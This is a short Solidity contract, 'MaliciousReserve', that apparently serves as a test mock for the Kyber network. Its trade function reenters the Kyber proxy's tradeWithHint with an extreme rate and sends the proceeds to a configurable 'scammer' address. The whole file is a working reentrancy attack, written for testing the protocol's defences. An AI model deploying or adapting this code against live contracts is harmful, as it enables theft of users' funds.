pragma solidity 0.4.18;


import "../KyberReserve.sol";
import "../KyberNetworkProxyInterface.sol";

contract MaliciousReserve is KyberReserve {

    KyberNetworkProxyInterface proxy;
    address public scammer;
    ERC20 public scamToken;

    uint public numRecursive = 1;

    function MaliciousReserve(address _kyberNetwork, ConversionRatesInterface _ratesContract, address _admin)
        KyberReserve(_kyberNetwork, _ratesContract, _admin) public
    {

    }

    function trade(
        ERC20 srcToken,
        uint srcAmount,
        ERC20 destToken,
        address destAddress,
        uint conversionRate,
        bool validate
    )
        public
        payable
        returns(bool)
    {
        require(tradeEnabled);
        require(msg.sender == kyberNetwork);

        require(srcToken == ETH_TOKEN_ADDRESS);

        if (numRecursive > 0) {
            --numRecursive;

            doTrade();
        }

        require(doTrade(srcToken, srcAmount, destToken, destAddress, conversionRate, validate));

        return true;
    }

    function setKyberProxy(KyberNetworkProxyInterface _proxy) public {

        require(_proxy != address(0));

        proxy = _proxy;
    }

    function doTrade () public {
        uint callValue = 341;
        bytes memory hint;

        ERC20 srcToken = ERC20(ETH_TOKEN_ADDRESS);
        proxy.tradeWithHint.value(callValue)(srcToken, callValue, scamToken, scammer, (2 ** 255), 0, 0, hint);
    }

    function setDestAddress(address _scammer) public {
        require(_scammer != address(0));
        scammer = _scammer;
    }

    function setDestToken (ERC20 _token) public {
        scamToken = _token;
    }

    function setNumRecursive(uint num)  public {
        numRecursive = num;
    }
}

